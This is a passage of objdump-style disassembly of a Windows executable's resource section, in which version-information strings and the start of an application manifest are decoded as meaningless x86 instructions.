  4079f6:	dec    ecx
  4079f7:	inc    esp
  4079f8:	xor    al,BYTE PTR [eax]
  4079fa:	or     eax,0x6d656d05
  4079ff:	jae    0x407a66
  407a01:	je     0x407a03
	...

Disassembly of section .rsrc:

00408000 <.rsrc>:
	...
  40800c:	add    BYTE PTR [eax],al
  40800e:	add    eax,0x300
  408013:	add    BYTE PTR [eax],bh
  408015:	add    BYTE PTR [eax],al
  408017:	add    BYTE PTR [esi],0x0
  40801a:	add    BYTE PTR [eax],al
  40801c:	mov    eax,0xe800000
  408021:	add    BYTE PTR [eax],al
  408023:	add    al,dl
  408025:	add    BYTE PTR [eax],al
  408027:	adc    BYTE PTR [eax],0x0
  40802a:	add    BYTE PTR [eax],al
  40802c:	call   0x18c08031
  408031:	add    BYTE PTR [eax],al
  408033:	add    BYTE PTR [eax],al
  408035:	add    DWORD PTR [eax],eax
  408037:	add    BYTE PTR [eax],0x0
	...
  408046:	push   cs
  408047:	add    BYTE PTR [ecx],al
  408049:	add    BYTE PTR [eax],al
  40804b:	add    BYTE PTR [eax],bl
  40804d:	add    DWORD PTR [eax],eax
  40804f:	add    BYTE PTR [edx],0x0
  408052:	add    BYTE PTR [eax],al
  408054:	xor    BYTE PTR [ecx],al
  408056:	add    BYTE PTR [eax+0x3],al
  40805c:	dec    eax
  40805d:	add    DWORD PTR [eax],eax
  40805f:	add    BYTE PTR [eax+eax*1],0x0
  408063:	add    BYTE PTR [eax+0x1],ah
  408066:	add    BYTE PTR [eax+0x5],al
  40806c:	js     0x40806f
  40806e:	add    BYTE PTR [eax+0x6],al
  408074:	nop
  408075:	add    DWORD PTR [eax],eax
  408077:	add    BYTE PTR [edi],0x0
  40807a:	add    BYTE PTR [eax],al
  40807c:	test   al,0x1
  40807e:	add    BYTE PTR [eax+0x8],al
  408084:	rol    BYTE PTR [ecx],0x0
  408087:	or     BYTE PTR [ecx],0x0
  40808a:	add    BYTE PTR [eax],al
  40808c:	fadd   DWORD PTR [ecx]
  40808e:	add    BYTE PTR [eax+0xa],al
  408094:	lock add DWORD PTR [eax],eax
  408097:	or     BYTE PTR [ebx],0x0
  40809a:	add    BYTE PTR [eax],al
  40809c:	or     BYTE PTR [edx],al
  40809e:	add    BYTE PTR [eax+0xc],al
  4080a4:	and    BYTE PTR [edx],al
  4080a6:	add    BYTE PTR [eax+0xd],al
  4080ac:	cmp    BYTE PTR [edx],al
  4080ae:	add    BYTE PTR [eax+0xe],al
  4080b4:	push   eax
  4080b5:	add    al,BYTE PTR [eax]
  4080b7:	add    BYTE PTR [eax],0x0
	...
  4080c6:	add    DWORD PTR [eax],eax
  4080c8:	dec    esp
  4080c9:	add    DWORD PTR [eax],eax
  4080cb:	add    BYTE PTR [eax+0x2],ch
  4080ce:	add    BYTE PTR [eax+0x0],al
	...
  4080dc:	add    BYTE PTR [eax],al
  4080de:	add    DWORD PTR [eax],eax
  4080e0:	add    DWORD PTR [eax],eax
  4080e2:	add    BYTE PTR [eax],al
  4080e4:	mov    BYTE PTR [edx],al
  4080e6:	add    BYTE PTR [eax+0x0],al
	...
  4080f4:	add    BYTE PTR [eax],al
  4080f6:	add    DWORD PTR [eax],eax
  4080f8:	add    DWORD PTR [eax],eax
  4080fa:	add    BYTE PTR [eax],al
  4080fc:	mov    al,ds:0x800002
	...
  40810d:	add    BYTE PTR [ecx],al
  40810f:	add    BYTE PTR [ecx],al
  408111:	add    BYTE PTR [eax],al
  408113:	add    BYTE PTR [eax+0x800002],bh
	...
  408125:	add    BYTE PTR [ecx],al
  408127:	add    BYTE PTR [eax],al
  408129:	add    al,0x0
  40812b:	add    al,dl
  40812d:	add    al,BYTE PTR [eax]
	...
  40813b:	add    BYTE PTR [eax],al
  40813d:	add    BYTE PTR [ecx],al
  40813f:	add    BYTE PTR [eax],al
  408141:	add    al,0x0
  408143:	add    al,ah
  408145:	add    al,BYTE PTR [eax]
	...
  408153:	add    BYTE PTR [eax],al
  408155:	add    BYTE PTR [ecx],al
  408157:	add    BYTE PTR [eax],al
  408159:	add    al,0x0
  40815b:	add    al,dh
  40815d:	add    al,BYTE PTR [eax]
	...
  40816b:	add    BYTE PTR [eax],al
  40816d:	add    BYTE PTR [ecx],al
  40816f:	add    BYTE PTR [eax],al
  408171:	add    al,0x0
  408173:	add    BYTE PTR [eax],al
  408175:	add    eax,DWORD PTR [eax]
	...
  408183:	add    BYTE PTR [eax],al
  408185:	add    BYTE PTR [ecx],al
  408187:	add    BYTE PTR [eax],al
  408189:	add    al,0x0
  40818b:	add    BYTE PTR [eax],dl
  40818d:	add    eax,DWORD PTR [eax]
	...
  40819b:	add    BYTE PTR [eax],al
  40819d:	add    BYTE PTR [ecx],al
  40819f:	add    BYTE PTR [eax],al
  4081a1:	add    al,0x0
  4081a3:	add    BYTE PTR [eax],ah
  4081a5:	add    eax,DWORD PTR [eax]
	...
  4081b3:	add    BYTE PTR [eax],al
  4081b5:	add    BYTE PTR [ecx],al
  4081b7:	add    BYTE PTR [eax],al
  4081b9:	add    al,0x0
  4081bb:	add    BYTE PTR [eax],dh
  4081bd:	add    eax,DWORD PTR [eax]
	...
  4081cb:	add    BYTE PTR [eax],al
  4081cd:	add    BYTE PTR [ecx],al
  4081cf:	add    BYTE PTR [eax],al
  4081d1:	add    al,0x0
  4081d3:	add    BYTE PTR [eax+0x3],al
	...
  4081e6:	add    DWORD PTR [eax],eax
  4081e8:	add    BYTE PTR [eax+eax*1],al
  4081eb:	add    BYTE PTR [eax+0x3],dl
	...
  4081fe:	add    DWORD PTR [eax],eax
  408200:	add    BYTE PTR [eax+eax*1],al
  408203:	add    BYTE PTR [eax+0x3],ah
	...
  408216:	add    DWORD PTR [eax],eax
  408218:	add    BYTE PTR [eax+eax*1],al
  40821b:	add    BYTE PTR [eax+0x3],dh
	...
  40822e:	add    DWORD PTR [eax],eax
  408230:	add    BYTE PTR [eax+eax*1],al
  408233:	add    BYTE PTR [eax+0x3],al
	...
  408245:	add    BYTE PTR [ecx],al
  408247:	add    BYTE PTR [eax],al
  408249:	add    al,0x0
  40824b:	add    BYTE PTR [eax+0x3],dl
	...
  40825d:	add    BYTE PTR [ecx],al
  40825f:	add    BYTE PTR [eax],al
  408261:	add    al,0x0
  408263:	add    BYTE PTR [eax+0x3],ah
	...
  408275:	add    BYTE PTR [edx],al
  408277:	add    BYTE PTR [ecx],cl
  408279:	add    al,0x0
  40827b:	add    BYTE PTR [eax+0x11000003],dh
  408281:	add    al,0x0
  408283:	add    al,al
  408285:	add    eax,DWORD PTR [eax]
	...
  408293:	add    BYTE PTR [eax],al
  408295:	add    BYTE PTR [ecx],al
  408297:	add    BYTE PTR [eax],al
  408299:	add    al,0x0
  40829b:	add    al,dl
  40829d:	add    eax,DWORD PTR [eax]
	...
  4082ab:	add    BYTE PTR [eax],al
  4082ad:	add    BYTE PTR [ecx],al
  4082af:	add    BYTE PTR [ecx],cl
  4082b1:	add    al,0x0
  4082b3:	add    al,ah
  4082b5:	add    eax,DWORD PTR [eax]
	...
  4082c3:	add    BYTE PTR [eax],al
  4082c5:	add    BYTE PTR [ecx],al
  4082c7:	add    BYTE PTR [eax],al
  4082c9:	add    al,0x0
  4082cb:	add    al,dh
  4082cd:	add    eax,DWORD PTR [eax]
  4082cf:	add    BYTE PTR [eax-0x75],bl
  4082d2:	add    BYTE PTR [eax],al
  4082d4:	call   0x4082db
  4082d9:	add    BYTE PTR [eax],al
  4082db:	add    BYTE PTR [eax],al
  4082dd:	add    BYTE PTR [eax],al
  4082df:	add    BYTE PTR [eax-0x72],al
  4082e2:	add    BYTE PTR [eax],al
  4082e4:	sub    BYTE PTR [ecx],al
	...
  4082ee:	add    BYTE PTR [eax],al
  4082f0:	push   0xa800008f
  4082f5:	push   cs
	...
  4082fe:	add    BYTE PTR [eax],al
  408300:	adc    BYTE PTR [esi+0xba80000],bl
	...
  40830e:	add    BYTE PTR [eax],al
  408310:	mov    eax,0xa80000a9
  408315:	or     BYTE PTR [eax],al
	...
  40831f:	add    BYTE PTR [eax-0x4e],ah
  408322:	add    BYTE PTR [eax],al
  408324:	enter  0x6,0x0
	...
  408330:	sub    BYTE PTR [ecx+0x6080000],bh
	...
  40833e:	add    BYTE PTR [eax],al
  408340:	xor    BYTE PTR [edi+0x5680000],bh
	...
  40834e:	add    BYTE PTR [eax],al
  408350:	cwde   
  408351:	les    eax,FWORD PTR [eax]
  408353:	add    BYTE PTR [eax+0x25],ch
  408359:	add    BYTE PTR [eax],al
  40835b:	add    BYTE PTR [eax],al
  40835d:	add    BYTE PTR [eax],al
  40835f:	add    BYTE PTR [eax-0x16],al
  408362:	add    BYTE PTR [eax],al
  408364:	push   0x1a
  408369:	add    BYTE PTR [eax],al
  40836b:	add    BYTE PTR [eax],al
  40836d:	add    BYTE PTR [eax],al
  40836f:	add    BYTE PTR [eax-0x57fffefc],ch
  408375:	adc    BYTE PTR [eax],al
	...
  40837f:	add    BYTE PTR [eax+0x15],dl
  408382:	add    DWORD PTR [eax],eax
  408384:	mov    BYTE PTR [ecx],cl
	...
  40838e:	add    BYTE PTR [eax],al
  408390:	fcomp  DWORD PTR [esi]
  408392:	add    DWORD PTR [eax],eax
  408394:	mov    eax,0x6
  408399:	add    BYTE PTR [eax],al
  40839b:	add    BYTE PTR [eax],al
  40839d:	add    BYTE PTR [eax],al
  40839f:	add    BYTE PTR [eax+0x68000125],dl
  4083a5:	add    al,0x0
	...
  4083af:	add    BYTE PTR [eax+0x2c],cl
  4083b2:	add    DWORD PTR [eax],eax
  4083b4:	mov    eax,0x2
  4083b9:	add    BYTE PTR [eax],al
  4083bb:	add    BYTE PTR [eax],al
  4083bd:	add    BYTE PTR [eax],al
  4083bf:	add    al,cl
  4083c1:	sub    al,BYTE PTR [ecx]
  4083c3:	add    BYTE PTR [eax+0x1],al
  4083c9:	add    BYTE PTR [eax],al
  4083cb:	add    BYTE PTR [eax],al
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    al,bh
  4083d1:	sub    DWORD PTR [ecx],eax
  4083d3:	add    dl,cl
	...
  4083e1:	test   BYTE PTR [eax],al
  4083e3:	add    BYTE PTR [eax+0x3],cl
  4083e9:	add    BYTE PTR [eax],al
  4083eb:	add    BYTE PTR [eax],al
  4083ed:	add    BYTE PTR [eax],al
  4083ef:	add    BYTE PTR [eax-0x2fffff79],cl
  4083f5:	add    eax,DWORD PTR [eax]
	...
  4083ff:	add    BYTE PTR [eax+0x3403],cl
  408405:	add    BYTE PTR [esi+0x0],dl
  408408:	push   ebx
  408409:	add    BYTE PTR [edi+0x0],bl
  40840c:	push   esi
  40840d:	add    BYTE PTR [ebp+0x0],al
  408410:	push   edx
  408411:	add    BYTE PTR [ebx+0x0],dl
  408414:	dec    ecx
  408415:	add    BYTE PTR [edi+0x0],cl
  408418:	dec    esi
  408419:	add    BYTE PTR [edi+0x0],bl
  40841c:	dec    ecx
  40841d:	add    BYTE PTR [esi+0x0],cl
  408420:	inc    esi
  408421:	add    BYTE PTR [edi+0x0],cl
  408424:	add    BYTE PTR [eax],al
  408426:	add    BYTE PTR [eax],al
  408428:	mov    ebp,0xfeef04
  40842d:	add    BYTE PTR [ecx],al
  40842f:	add    BYTE PTR [eax],al
  408431:	add    BYTE PTR [edi],cl
  408433:	add    BYTE PTR [edx],dh
  408435:	inc    ebx
  408436:	add    BYTE PTR [eax],ch
  408438:	add    BYTE PTR [eax],al
  40843a:	(bad)  
  40843c:	xor    al,BYTE PTR [ebx+0x0]
  40843f:	sub    BYTE PTR [edi],bh
  408441:	add    BYTE PTR [eax],al
  408443:	add    BYTE PTR [eax],al
  408445:	add    BYTE PTR [eax],al
  408447:	add    BYTE PTR [eax+eax*1],al
  40844a:	add    al,0x0
  40844c:	add    DWORD PTR [eax],eax
	...
  40845a:	add    BYTE PTR [eax],al
  40845c:	out    0x2,al
  40845e:	add    BYTE PTR [eax],al
  408460:	add    DWORD PTR [eax],eax
  408462:	push   ebx
  408463:	add    BYTE PTR [eax+eax*1+0x72],dh
  408467:	add    BYTE PTR [ecx+0x0],ch
  40846a:	outs   dx,BYTE PTR ds:[esi]
  40846b:	add    BYTE PTR [edi+0x0],ah
  40846e:	inc    esi
  40846f:	add    BYTE PTR [ecx+0x0],ch
  408472:	ins    BYTE PTR es:[edi],dx
  408473:	add    BYTE PTR [ebp+0x0],ah
  408476:	dec    ecx
  408477:	add    BYTE PTR [esi+0x0],ch
  40847a:	data16 add BYTE PTR [edi+0x0],ch
  40847e:	add    BYTE PTR [eax],al
  408480:	ret    0x2
  408483:	add    BYTE PTR [ecx],al
  408485:	add    BYTE PTR [eax],dh
  408487:	add    BYTE PTR [eax],dh
  408489:	add    BYTE PTR [eax],dh
  40848b:	add    BYTE PTR [eax],dh
  40848d:	add    BYTE PTR [eax],dh
  40848f:	add    BYTE PTR [eax+eax*1],dh
  408492:	bound  eax,QWORD PTR [eax]
  408494:	xor    BYTE PTR [eax],al
  408496:	add    BYTE PTR [eax],al
  408498:	dec    esp
  408499:	add    BYTE PTR [esi],dl
  40849b:	add    BYTE PTR [ecx],al
  40849d:	add    BYTE PTR [ebx+0x0],al
  4084a0:	outs   dx,DWORD PTR ds:[esi]
  4084a1:	add    BYTE PTR [ebp+0x0],ch
  4084a4:	jo     0x4084a6
  4084a6:	popa   
  4084a7:	add    BYTE PTR [esi+0x0],ch
  4084aa:	jns    0x4084ac
  4084ac:	dec    esi
  4084ad:	add    BYTE PTR [ecx+0x0],ah
  4084b0:	ins    DWORD PTR es:[edi],dx
  4084b1:	add    BYTE PTR [ebp+0x0],ah
  4084b4:	add    BYTE PTR [eax],al
  4084b6:	add    BYTE PTR [eax],al
  4084b8:	dec    ebp
  4084b9:	add    BYTE PTR [ecx+0x0],ch
  4084bc:	arpl   WORD PTR [eax],ax
  4084be:	jb     0x4084c0
  4084c0:	outs   dx,DWORD PTR ds:[esi]
  4084c1:	add    BYTE PTR [ebx+0x0],dh
  4084c4:	outs   dx,DWORD PTR ds:[esi]
  4084c5:	add    BYTE PTR [esi+0x0],ah
  4084c8:	je     0x4084ca
  4084ca:	and    BYTE PTR [eax],al
  4084cc:	inc    ebx
  4084cd:	add    BYTE PTR [edi+0x0],ch
  4084d0:	jb     0x4084d2
  4084d2:	jo     0x4084d4
  4084d4:	outs   dx,DWORD PTR ds:[esi]
  4084d5:	add    BYTE PTR [edx+0x0],dh
  4084d8:	popa   
  4084d9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4084dd:	add    BYTE PTR [edi+0x0],ch
  4084e0:	outs   dx,BYTE PTR ds:[esi]
  4084e1:	add    BYTE PTR [eax],al
  4084e3:	add    BYTE PTR [eax+eax*1+0xe],al
  4084e7:	add    BYTE PTR [ecx],al
  4084e9:	add    BYTE PTR [esi+0x0],al
  4084ec:	imul   eax,DWORD PTR [eax],0x65006c
  4084f2:	inc    esp
  4084f3:	add    BYTE PTR [ebp+0x0],ah
  4084f6:	jae    0x4084f8
  4084f8:	arpl   WORD PTR [eax],ax
  4084fa:	jb     0x4084fc
  4084fc:	imul   eax,DWORD PTR [eax],0x740070
  408502:	imul   eax,DWORD PTR [eax],0x6e006f
  408508:	add    BYTE PTR [eax],al
  40850a:	add    BYTE PTR [eax],al
  40850c:	dec    ebp
  40850d:	add    BYTE PTR [ecx+0x0],ch
  408510:	arpl   WORD PTR [eax],ax
  408512:	jb     0x408514
  408514:	outs   dx,DWORD PTR ds:[esi]
  408515:	add    BYTE PTR [ebx+0x0],dh
  408518:	outs   dx,DWORD PTR ds:[esi]
  408519:	add    BYTE PTR [esi+0x0],ah
  40851c:	je     0x40851e
  40851e:	and    BYTE PTR [eax],al
  408520:	dec    ecx
  408521:	add    BYTE PTR [ebp+0x0],cl
  408524:	inc    ebp
  408525:	add    BYTE PTR [eax],al
  408527:	add    BYTE PTR [esi+0x0],ch
  40852a:	daa    
  40852b:	add    BYTE PTR [ecx],al
  40852d:	add    BYTE PTR [esi+0x0],al
  408530:	imul   eax,DWORD PTR [eax],0x65006c
  408536:	push   esi
  408537:	add    BYTE PTR [ebp+0x0],ah
  40853a:	jb     0x40853c
  40853c:	jae    0x40853e
  40853e:	imul   eax,DWORD PTR [eax],0x6e006f
  408544:	add    BYTE PTR [eax],al
  408546:	add    BYTE PTR [eax],al
  408548:	xor    DWORD PTR [eax],eax
  40854a:	xor    eax,0x30002e00
  40854f:	add    BYTE PTR [esi],ch
  408551:	add    BYTE PTR [ecx],dh
  408553:	add    BYTE PTR [eax],dh
  408555:	add    BYTE PTR [edx],dh
  408557:	add    BYTE PTR [eax+eax*1],dh
  40855a:	xor    BYTE PTR [eax],al
  40855c:	add    BYTE PTR cs:[ecx],dh
  40855f:	add    BYTE PTR [edi],dh
  408561:	add    BYTE PTR [edx],dh
  408563:	add    BYTE PTR [eax],dh
  408565:	add    BYTE PTR [edx],dh
  408567:	add    BYTE PTR [eax],ah
  408569:	add    BYTE PTR [eax],ch
  40856b:	add    BYTE PTR [eax+eax*1+0x68],dh
  40856f:	add    BYTE PTR [ecx],dh
  408571:	add    BYTE PTR [edi+0x0],bl
  408574:	jae    0x408576
  408576:	je     0x408578
  408578:	xor    DWORD PTR [eax],eax
  40857a:	add    BYTE PTR cs:[ecx],dh
  40857d:	add    BYTE PTR [esi],dh
  40857f:	add    BYTE PTR [ecx],dh
  408581:	add    BYTE PTR [ecx],dh
  408583:	add    BYTE PTR [ecx],dh
  408585:	add    BYTE PTR [eax],bh
  408587:	add    BYTE PTR ds:0x38003100,ch
  40858d:	add    BYTE PTR [ebx],dh
  40858f:	add    BYTE PTR [esi],dh
  408591:	add    BYTE PTR [ecx],ch
  408593:	add    BYTE PTR [eax],al
  408595:	add    BYTE PTR [eax],al
  408597:	add    BYTE PTR [eax],bh
  408599:	add    BYTE PTR [eax+eax*1],cl
  40859c:	add    DWORD PTR [eax],eax
  40859e:	dec    ecx
  40859f:	add    BYTE PTR [esi+0x0],ch
  4085a2:	je     0x4085a4
  4085a4:	add    BYTE PTR gs:[edx+0x0],dh
  4085a8:	outs   dx,BYTE PTR ds:[esi]
  4085a9:	add    BYTE PTR [ecx+0x0],ah
  4085ac:	ins    BYTE PTR es:[edi],dx
  4085ad:	add    BYTE PTR [esi+0x0],cl
  4085b0:	popa   
  4085b1:	add    BYTE PTR [ebp+0x0],ch
  4085b4:	add    BYTE PTR gs:[eax],al
  4085b7:	add    BYTE PTR [ecx+0x0],ch
  4085ba:	ins    DWORD PTR es:[edi],dx
  4085bb:	add    BYTE PTR [edx+0x0],ch
  4085be:	jo     0x4085c0
  4085c0:	jne    0x4085c2
  4085c2:	add    BYTE PTR gs:[eax+0x0],bh
  4085c6:	add    BYTE PTR cs:[ebp+0x0],ah
  4085ca:	js     0x4085cc
  4085cc:	add    BYTE PTR gs:[eax],al
  4085cf:	add    BYTE PTR [eax+0x1002e00],al
  4085d5:	add    BYTE PTR [eax+eax*1+0x65],cl
  4085d9:	add    BYTE PTR [edi+0x0],ah
  4085dc:	popa   
  4085dd:	add    BYTE PTR [eax+eax*1+0x43],ch
  4085e1:	add    BYTE PTR [edi+0x0],ch
  4085e4:	jo     0x4085e6
  4085e6:	jns    0x4085e8
  4085e8:	jb     0x4085ea
  4085ea:	imul   eax,DWORD PTR [eax],0x680067
  4085f0:	je     0x4085f2
  4085f2:	add    BYTE PTR [eax],al
  4085f4:	test   eax,0x4d002000
  4085f9:	add    BYTE PTR [ecx+0x0],ch
  4085fc:	arpl   WORD PTR [eax],ax
  4085fe:	jb     0x408600
  408600:	outs   dx,DWORD PTR ds:[esi]
  408601:	add    BYTE PTR [ebx+0x0],dh
  408604:	outs   dx,DWORD PTR ds:[esi]
  408605:	add    BYTE PTR [esi+0x0],ah
  408608:	je     0x40860a
  40860a:	and    BYTE PTR [eax],al
  40860c:	inc    ebx
  40860d:	add    BYTE PTR [edi+0x0],ch
  408610:	jb     0x408612
  408612:	jo     0x408614
  408614:	outs   dx,DWORD PTR ds:[esi]
  408615:	add    BYTE PTR [edx+0x0],dh
  408618:	popa   
  408619:	add    BYTE PTR [eax+eax*1+0x69],dh
  40861d:	add    BYTE PTR [edi+0x0],ch
  408620:	outs   dx,BYTE PTR ds:[esi]
  408621:	add    BYTE PTR [esi],ch
  408623:	add    BYTE PTR [eax],ah
  408625:	add    BYTE PTR [ecx+0x0],al
  408628:	ins    BYTE PTR es:[edi],dx
  408629:	add    BYTE PTR [eax+eax*1+0x20],ch
  40862d:	add    BYTE PTR [edx+0x0],dh
  408630:	imul   eax,DWORD PTR [eax],0x680067
  408636:	je     0x408638
  408638:	jae    0x40863a
  40863a:	and    BYTE PTR [eax],al
  40863c:	jb     0x40863e
  40863e:	add    BYTE PTR gs:[ebx+0x0],dh
  408642:	add    BYTE PTR gs:[edx+0x0],dh
  408646:	jbe    0x408648
  408648:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40864d:	add    BYTE PTR [eax],al
  40864f:	add    BYTE PTR [eax+0x0],al
  408652:	or     al,0x0
  408654:	add    DWORD PTR [eax],eax
  408656:	dec    edi
  408657:	add    BYTE PTR [edx+0x0],dh
  40865a:	imul   eax,DWORD PTR [eax],0x690067
  408660:	outs   dx,BYTE PTR ds:[esi]
  408661:	add    BYTE PTR [ecx+0x0],ah
  408664:	ins    BYTE PTR es:[edi],dx
  408665:	add    BYTE PTR [esi+0x0],al
  408668:	imul   eax,DWORD PTR [eax],0x65006c
  40866e:	outs   dx,BYTE PTR ds:[esi]
  40866f:	add    BYTE PTR [ecx+0x0],ah
  408672:	ins    DWORD PTR es:[edi],dx
  408673:	add    BYTE PTR [ebp+0x0],ah
  408676:	add    BYTE PTR [eax],al
  408678:	imul   eax,DWORD PTR [eax],0x6a006d
  40867e:	jo     0x408680
  408680:	jne    0x408682
  408682:	add    BYTE PTR gs:[eax+0x0],bh
  408686:	add    BYTE PTR cs:[ebp+0x0],ah
  40868a:	js     0x40868c
  40868c:	add    BYTE PTR gs:[eax],al
  40868f:	add    BYTE PTR [edx+0x0],ch
  408692:	and    eax,0x50000100
  408697:	add    BYTE PTR [edx+0x0],dh
  40869a:	outs   dx,DWORD PTR ds:[esi]
  40869b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40869f:	add    BYTE PTR [ebx+0x0],ah
  4086a2:	je     0x4086a4
  4086a4:	dec    esi
  4086a5:	add    BYTE PTR [ecx+0x0],ah
  4086a8:	ins    DWORD PTR es:[edi],dx
  4086a9:	add    BYTE PTR [ebp+0x0],ah
  4086ac:	add    BYTE PTR [eax],al
  4086ae:	add    BYTE PTR [eax],al
  4086b0:	dec    ebp
  4086b1:	add    BYTE PTR [ecx+0x0],ch
  4086b4:	arpl   WORD PTR [eax],ax
  4086b6:	jb     0x4086b8
  4086b8:	outs   dx,DWORD PTR ds:[esi]
  4086b9:	add    BYTE PTR [ebx+0x0],dh
  4086bc:	outs   dx,DWORD PTR ds:[esi]
  4086bd:	add    BYTE PTR [esi+0x0],ah
  4086c0:	je     0x4086c2
  4086c2:	scas   al,BYTE PTR es:[edi]
  4086c3:	add    BYTE PTR [eax],ah
  4086c5:	add    BYTE PTR [edi+0x0],dl
  4086c8:	imul   eax,DWORD PTR [eax],0x64006e
  4086ce:	outs   dx,DWORD PTR ds:[esi]
  4086cf:	add    BYTE PTR [edi+0x0],dh
  4086d2:	jae    0x4086d4
  4086d4:	scas   al,BYTE PTR es:[edi]
  4086d5:	add    BYTE PTR [eax],ah
  4086d7:	add    BYTE PTR [edi+0x0],cl
  4086da:	jo     0x4086dc
  4086dc:	add    BYTE PTR gs:[edx+0x0],dh
  4086e0:	popa   
  4086e1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4086e5:	add    BYTE PTR [esi+0x0],ch
  4086e8:	add    BYTE PTR [bx+si],ah
  4086eb:	add    BYTE PTR [ebx+0x0],dl
  4086ee:	jns    0x4086f0
  4086f0:	jae    0x4086f2
  4086f2:	je     0x4086f4
  4086f4:	add    BYTE PTR gs:[ebp+0x0],ch
  4086f8:	add    BYTE PTR [eax],al
  4086fa:	add    BYTE PTR [eax],al
  4086fc:	inc    esi
  4086fd:	add    BYTE PTR [ecx],dl
  4086ff:	add    BYTE PTR [ecx],al
  408701:	add    BYTE PTR [eax+0x0],dl
  408704:	jb     0x408706
  408706:	outs   dx,DWORD PTR ds:[esi]
  408707:	add    BYTE PTR [eax+eax*1+0x75],ah
  40870b:	add    BYTE PTR [ebx+0x0],ah
  40870e:	je     0x408710
  408710:	push   esi
  408711:	add    BYTE PTR [ebp+0x0],ah
  408714:	jb     0x408716
  408716:	jae    0x408718
  408718:	imul   eax,DWORD PTR [eax],0x6e006f
  40871e:	add    BYTE PTR [eax],al
  408720:	xor    DWORD PTR [eax],eax
  408722:	xor    eax,0x30002e00
  408727:	add    BYTE PTR [esi],ch
  408729:	add    BYTE PTR [ecx],dh
  40872b:	add    BYTE PTR [eax],dh
  40872d:	add    BYTE PTR [edx],dh
  40872f:	add    BYTE PTR [eax+eax*1],dh
  408732:	xor    BYTE PTR [eax],al
  408734:	add    BYTE PTR cs:[ecx],dh
  408737:	add    BYTE PTR [edi],dh
  408739:	add    BYTE PTR [edx],dh
  40873b:	add    BYTE PTR [eax],dh
  40873d:	add    BYTE PTR [edx],dh
  40873f:	add    BYTE PTR [eax],al
  408741:	add    BYTE PTR [eax],al
  408743:	add    BYTE PTR [eax+eax*1+0x0],al
  408747:	add    BYTE PTR [ecx],al
  408749:	add    BYTE PTR [esi+0x0],dl
  40874c:	popa   
  40874d:	add    BYTE PTR [edx+0x0],dh
  408750:	inc    esi
  408751:	add    BYTE PTR [ecx+0x0],ch
  408754:	ins    BYTE PTR es:[edi],dx
  408755:	add    BYTE PTR [ebp+0x0],ah
  408758:	dec    ecx
  408759:	add    BYTE PTR [esi+0x0],ch
  40875c:	data16 add BYTE PTR [edi+0x0],ch
  408760:	add    BYTE PTR [eax],al
  408762:	add    BYTE PTR [eax],al
  408764:	and    al,0x0
  408766:	add    al,0x0
  408768:	add    BYTE PTR [eax],al
  40876a:	push   esp
  40876b:	add    BYTE PTR [edx+0x0],dh
  40876e:	popa   
  40876f:	add    BYTE PTR [esi+0x0],ch
  408772:	jae    0x408774
  408774:	ins    BYTE PTR es:[edi],dx
  408775:	add    BYTE PTR [ecx+0x0],ah
  408778:	je     0x40877a
  40877a:	imul   eax,DWORD PTR [eax],0x6e006f
  408780:	add    BYTE PTR [eax],al
  408782:	add    BYTE PTR [eax],al
  408784:	add    BYTE PTR [eax],al
  408786:	mov    al,0x4
  408788:	cmp    al,0x3f
  40878a:	js     0x4087f9
  40878c:	ins    BYTE PTR es:[edi],dx
  40878d:	and    BYTE PTR [esi+0x65],dh
  408790:	jb     0x408805
  408792:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  408799:	xor    BYTE PTR [edx],ah
  40879b:	and    BYTE PTR [ebp+0x6e],ah
  40879e:	arpl   WORD PTR [edi+0x64],bp
  4087a1:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  4087a8:	inc    esi
  4087a9:	sub    eax,0x73202238
  4087ae:	je     0x408811
  4087b0:	outs   dx,BYTE PTR ds:[esi]
  4087b1:	fs popa 
  4087b3:	ins    BYTE PTR es:[edi],dx
  4087b4:	outs   dx,DWORD PTR ds:[esi]
  4087b5:	outs   dx,BYTE PTR ds:[esi]
  4087b6:	gs cmp eax,0x73657922
  4087bc:	and    bh,BYTE PTR [edi]
  4087be:	ds or  eax,0x73613c0a
  4087c4:	jae    0x40882b
  4087c6:	ins    DWORD PTR es:[edi],dx
  4087c7:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4087cb:	js     0x40883a
  4087cd:	ins    BYTE PTR es:[edi],dx
  4087ce:	outs   dx,BYTE PTR ds:[esi]
  4087cf:	jae    0x40880e
  4087d1:	and    dh,BYTE PTR [ebp+0x72]
  4087d4:	outs   dx,BYTE PTR ds:[esi]
  4087d5:	cmp    dh,BYTE PTR [ebx+0x63]
  4087d8:	push   0x73616d65
  4087dd:	sub    eax,0x7263696d
  4087e2:	outs   dx,DWORD PTR ds:[esi]
  4087e3:	jae    0x408854
  4087e5:	data16 je 0x408815
  4087e8:	arpl   WORD PTR [edi+0x6d],bp
  4087eb:	cmp    ah,BYTE PTR [ecx+0x73]
  4087ee:	ins    DWORD PTR es:[edi],dx
  4087ef:	cs jbe 0x408823
  4087f2:	and    ah,BYTE PTR [eax]
  4087f4:	js     0x408863
  4087f6:	ins    BYTE PTR es:[edi],dx
  4087f7:	outs   dx,BYTE PTR ds:[esi]
  4087f8:	jae    0x408834
  4087fa:	popa   
  4087fb:	jae    0x40886a
  4087fd:	jbe    0x408832
  4087ff:	cmp    eax,0x6e727522
  408804:	cmp    dh,BYTE PTR [ebx+0x63]
  408807:	push   0x73616d65
  40880c:	sub    eax,0x7263696d
  408811:	outs   dx,DWORD PTR ds:[esi]
  408812:	jae    0x408883
  408814:	data16 je 0x408844
  408817:	arpl   WORD PTR [edi+0x6d],bp
  40881a:	cmp    ah,BYTE PTR [ecx+0x73]
  40881d:	ins    DWORD PTR es:[edi],dx
  40881e:	cs jbe 0x408854
  408821:	and    ah,BYTE PTR [eax]
  408823:	ins    DWORD PTR es:[edi],dx
  408824:	popa   
  408825:	outs   dx,BYTE PTR ds:[esi]
  408826:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40882d:	jb     0x4088a2
  40882f:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  408836:	xor    BYTE PTR [edx],ah
  408838:	ds or  eax,0x65643c0a
  40883e:	jo     0x4088a5
  408840:	outs   dx,BYTE PTR ds:[esi]
  408841:	fs outs dx,BYTE PTR gs:[esi]
  408844:	arpl   WORD PTR [ecx+0x3e],di
